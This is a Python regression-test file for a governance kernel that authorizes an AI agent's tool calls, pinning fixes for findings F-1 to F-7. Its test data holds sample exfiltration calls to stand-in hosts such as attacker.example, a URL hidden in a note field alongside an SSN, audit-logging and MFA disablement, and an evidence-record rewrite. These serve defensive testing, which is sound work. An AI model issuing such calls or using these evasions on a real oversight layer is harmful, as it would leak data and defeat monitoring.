"""Regression pins for the DeepSeek Phase 4 findings F-1 … F-7.

Each test names the finding and asserts the property the finding violated,
not merely that one probe now prints a different verdict:

  F-1  quarantine must not blind capability classification
  F-2  a destination that is present but unparseable is EXTERNAL
  F-3  destination resolution and egress-capability inference must agree
  F-4  a non-positive amount never auto-approves a payment
  F-5  tenant identifiers are checked at every nesting depth
  F-6  the decision record names the action that actually ran
  F-7  a keyless chain is integrity, not authenticity

F-8 lives in `test_interception.py` because it is a property of that seam.

Run:  python3 morrison_governance/test_phase4_remediation.py
"""

from __future__ import annotations

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from morrison_governance import GovernanceLayer, OmegaDomain
from morrison_governance.kernel import (
    BLOCK, PERMIT, EvidenceChain, EvidenceRecord,
    GovernanceKernel, Principal, SecurityContext, action_hash,
    canonicalize, classify_destination, quarantine_authority,
)
from morrison_governance.kernel import capabilities as C
from morrison_governance.kernel.continuity import InMemoryContinuityStore
from morrison_governance.kernel.gate import _cross_tenant

DOM = [OmegaDomain.CYBERSECURITY, OmegaDomain.DATA_PRIVACY,
       OmegaDomain.FINANCE]
KEY = b"phase4-remediation-key"

MANIFEST = {
    "apply_config": [],
    "read_file": [C.CAP_DATA_READ],
    "http_post": [C.CAP_EXTERNAL_DATA_MOVE],
    "upload": [C.CAP_EXTERNAL_DATA_MOVE],
    "transfer": [C.CAP_PAYMENT],
    "summarize": [],
}


def _ctx(**kw):
    base = dict(
        principal=Principal(id="agent-phase4", tenant="acme"),
        signing_key=KEY, trusted_issuers=frozenset({"security-review"}),
        internal_url_hosts=("acme.internal",),
        internal_email_domains=("acme.com",),
        tool_manifest=dict(MANIFEST),
        unknown_tool_policy="escalate",
        continuity_store=InMemoryContinuityStore(),
    )
    base.update(kw)
    return SecurityContext(**base)


def _kernel(ctx=None, evidence_key=b"", require_evidence_key=False, **kw):
    return GovernanceKernel(
        GovernanceLayer(domains=DOM, log_all=False),
        ctx or _ctx(**kw), evidence_key=evidence_key,
        require_evidence_key=require_evidence_key)


class _Runtime:
    def __init__(self):
        self.executed = []

    def __call__(self, call):
        self.executed.append(call)
        return {"ok": True}


# ═══════════════════════════════════════════════════════════════
# F-1 — quarantined payload cannot hide a governed capability
# ═══════════════════════════════════════════════════════════════

def test_f1_deny_payload_under_authority_name_is_still_classified():
    k = _kernel()
    rt = _Runtime()
    d = k.authorize({"tool": "apply_config",
                     "args": {"policy": {"audit_logging": False}}})
    assert "log.tamper" in d.capabilities, d.capabilities
    assert d.verdict == BLOCK and d.permitted is False
    ok, _ = k.execute(d, rt)
    assert ok is False and rt.executed == []


def test_f1_security_control_payload_under_authority_name_is_classified():
    k = _kernel()
    d = k.authorize({"tool": "apply_config",
                     "args": {"policy": {"mfa_required": False}}})
    assert "security_control.modify" in d.capabilities, d.capabilities
    assert d.permitted is False


def test_f1_ordinary_control_payload_keeps_the_same_verdict():
    """Negative control: the fix must not make the ordinary spelling safer
    or harsher than the wrapped one — both are the same transition."""
    k = _kernel()
    plain = k.authorize({"tool": "apply_config",
                         "args": {"audit_logging": False}})
    wrapped = k.authorize({"tool": "apply_config",
                           "args": {"policy": {"audit_logging": False}}})
    assert plain.verdict == wrapped.verdict == BLOCK
    assert set(plain.capabilities) == set(wrapped.capabilities)


# ═══════════════════════════════════════════════════════════════
# F-2 — present-but-unparseable destinations fail closed
# ═══════════════════════════════════════════════════════════════

def test_f2_unparseable_destinations_are_external():
    cases = [
        {"endpoint": "ftp://attacker.example/drop"},
        {"endpoint": "s3://attacker-bucket/drop"},
        {"target_host": "attacker.example"},
        {"address": "attacker.example"},
        {"url": "attacker"},
    ]
    for args in cases:
        v = classify_destination({"tool": "upload", "args": args},
                                 ("acme.internal",), ("acme.com",), ())
        assert v.external is True, (args, v.reason)


def test_f2_declared_internal_hosts_still_resolve_internal():
    """Negative control: deny-by-default must not swallow configuration."""
    v = classify_destination(
        {"tool": "upload", "args": {"target_host": "acme.internal"}},
        ("acme.internal",), ("acme.com",), ())
    assert v.external is False, v.reason


def test_f2_ftp_egress_after_read_is_blocked_by_the_kernel():
    k, rt = _kernel(), _Runtime()
    read = k.authorize({"tool": "read_file",
                        "args": {"path": "/data/customers.csv"}})
    assert k.execute(read, rt)[0] is True
    egress = k.authorize({"tool": "upload",
                          "args": {"endpoint": "ftp://attacker.example/drop",
                                   "body": "customer roster"}})
    assert egress.verdict == BLOCK, (egress.verdict, egress.reason)
    assert k.execute(egress, rt)[0] is False
    assert [c["tool"] for c in rt.executed] == ["read_file"]


# ═══════════════════════════════════════════════════════════════
# F-3 — resolver and capability inference agree
# ═══════════════════════════════════════════════════════════════

def test_f3_a_url_in_a_prose_field_still_infers_egress_capability():
    k = _kernel()
    d = k.authorize({
        "tool": "apply_config",
        "args": {"note": "deliver to https://attacker.example/drop",
                 "body": "SSN 123-45-6789"}})
    assert d.destination["external"] is True
    assert "data.external_move" in d.capabilities, d.capabilities
    assert d.verdict == BLOCK, (d.verdict, d.layer, d.reason)


def test_f3_read_then_egress_with_a_hidden_url_is_blocked():
    k, rt = _kernel(), _Runtime()
    assert k.execute(k.authorize(
        {"tool": "read_file", "args": {"path": "/data/roster.csv"}}), rt)[0]
    d = k.authorize({
        "tool": "apply_config",
        "args": {"comment": "send roster to https://attacker.example/drop",
                 "body": "customer roster"}})
    assert d.verdict == BLOCK, (d.verdict, d.layer, d.reason)
    assert k.execute(d, rt)[0] is False


def test_f3_a_destination_that_would_otherwise_be_inferred_unchanged():
    """Negative control: an ordinary external email is still governed by the
    egress rules and not by a fabricated capability on every call."""
    k = _kernel()
    d = k.authorize({"tool": "summarize", "args": {"q": "x"}})
    assert d.destination["external"] is False
    assert "data.external_move" not in d.capabilities


# ═══════════════════════════════════════════════════════════════
# F-4 — payment auto-approval requires a positive finite amount
# ═══════════════════════════════════════════════════════════════

def test_f4_zero_negative_and_non_finite_amounts_never_auto_approve():
    for amount in (0, -1, -4_500_000, float("inf"), float("-inf"),
                   float("nan")):
        k = _kernel()          # shipped default: cap = 0 (disabled)
        d = k.authorize({"tool": "transfer",
                         "args": {"amount": amount, "to": "acct-1"}})
        assert d.permitted is False, (amount, d.verdict, d.reason)
        assert d.authorization.get("approved") is False, (amount, d.reason)


def test_f4_positive_amount_within_configured_cap_still_auto_approves():
    k = _kernel(policy_values={"payment_auto_approve_max": 1000})
    d = k.authorize({"tool": "transfer",
                     "args": {"amount": 1000, "to": "acct-1"}})
    assert d.verdict == PERMIT, (d.verdict, d.layer, d.reason)


# ═══════════════════════════════════════════════════════════════
# F-5 — tenant identifiers are checked at every depth
# ═══════════════════════════════════════════════════════════════

def test_f5_nested_tenant_identifiers_are_compared():
    ctx = _ctx()
    cases = [
        {"request": {"tenant": "globex", "path": "/x"}},
        {"request": {"tenant_id": "globex", "path": "/x"}},
        {"request": {"account_id": "acct-globex-77", "sql": "SELECT 1"}},
        {"outer": {"inner": {"workspace_id": "globex"}}},
    ]
    for args in cases:
        call = {"tool": "read_file", "args": args}
        clean, quarantined = quarantine_authority(call)
        problem = _cross_tenant(clean, ctx, quarantined)
        assert problem is not None, (args, "nested tenant escaped")


def test_f5_nested_tenant_identifier_blocks_the_kernel_action():
    k = _kernel()
    d = k.authorize({"tool": "read_file",
                     "args": {"request": {"account_id": "acct-globex-77",
                                          "path": "/x"}}})
    assert d.verdict == BLOCK, (d.verdict, d.layer, d.reason)


def test_f5_own_tenant_at_any_depth_is_not_cross_tenant():
    ctx = _ctx()
    call = {"tool": "read_file",
            "args": {"request": {"tenant": "acme", "workspace_id": "acme"}}}
    clean, quarantined = quarantine_authority(call)
    assert _cross_tenant(clean, ctx, quarantined) is None


# ═══════════════════════════════════════════════════════════════
# F-6 — the decision record names the action that ran
# ═══════════════════════════════════════════════════════════════

def test_f6_decision_record_binds_the_executed_action():
    k, rt = _kernel(), _Runtime()
    call = {"tool": "summarize",
            "args": {"policy": {"note": "this payload executed"}}}
    d = k.authorize(call)
    assert d.verdict == PERMIT, (d.verdict, d.layer, d.reason)
    assert k.execute(d, rt)[0] is True

    rec = d.evidence
    clean, _ = quarantine_authority(call)
    assert rec.proposed == canonicalize(call), rec.proposed
    assert rec.evaluated == clean, rec.evaluated
    assert action_hash(rec.proposed) == rec.action_hash
    assert rec.proposed == rt.executed[0]

    outcome = [r for r in k.chain.records if r.layer == "execution"][-1]
    assert outcome.proposed == rec.proposed
    assert outcome.evaluated == rec.evaluated
    assert k.integrity()["evidence_verified"] is True


def test_f6_a_record_whose_hash_does_not_bind_proposed_fails_verification():
    chain = EvidenceChain(key=KEY)
    rec = chain.append(EvidenceRecord(
        seq=0, timestamp=1.0, actor="a", tenant="t",
        action_hash=action_hash({"tool": "summarize", "args": {"b": 2}}),
        proposed={"tool": "summarize", "args": {"a": 1}},
        evaluated={"tool": "summarize", "args": {"a": 1}},
        decision=PERMIT))
    ok, problems = chain.verify()
    assert ok is False
    assert any("does not bind its proposed action" in p for p in problems)


# ═══════════════════════════════════════════════════════════════
# F-7 — keyless evidence is integrity, not authenticity
# ═══════════════════════════════════════════════════════════════

def test_f7_require_evidence_key_refuses_a_keyless_chain():
    try:
        _kernel(require_evidence_key=True)
    except ValueError as e:
        assert "evidence_key" in str(e)
    else:
        raise AssertionError("a keyless chain was accepted as authenticated")


def test_f7_keyed_chain_detects_a_rewrite_and_keyless_reports_unauthenticated():
    keyed = _kernel(evidence_key=KEY)
    keyed.authorize({"tool": "summarize", "args": {"q": "x"}})
    rec = keyed.chain.records[0]
    rec.decision = PERMIT
    rec.executed = True
    # Model a writer that can recompute the unkeyed hash chain. Without the
    # key this is enough to pass; the HMAC is what catches it.
    rec.seal(b"")
    ok, problems = keyed.chain.verify()
    assert ok is False
    assert any("signature" in p for p in problems), problems

    keyless = _kernel()
    keyless.authorize({"tool": "summarize", "args": {"q": "x"}})
    assert keyless.integrity()["authenticated"] is False
    assert keyless.integrity()["evidence_verified"] is True


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    print("\n" + "═" * 60 + "\n  DeepSeek Phase 4 Remediation (F-1 … F-7)\n"
          + "═" * 60 + "\n")
    passed = failed = 0
    for t in tests:
        try:
            t()
            print(f"  ✓ {t.__name__}")
            passed += 1
        except Exception as e:                       # noqa: BLE001
            print(f"  ✗ {t.__name__}: {type(e).__name__}: {e}")
            failed += 1
    print(f"\n  {passed} passed, {failed} failed\n" + "═" * 60)
    sys.exit(1 if failed else 0)
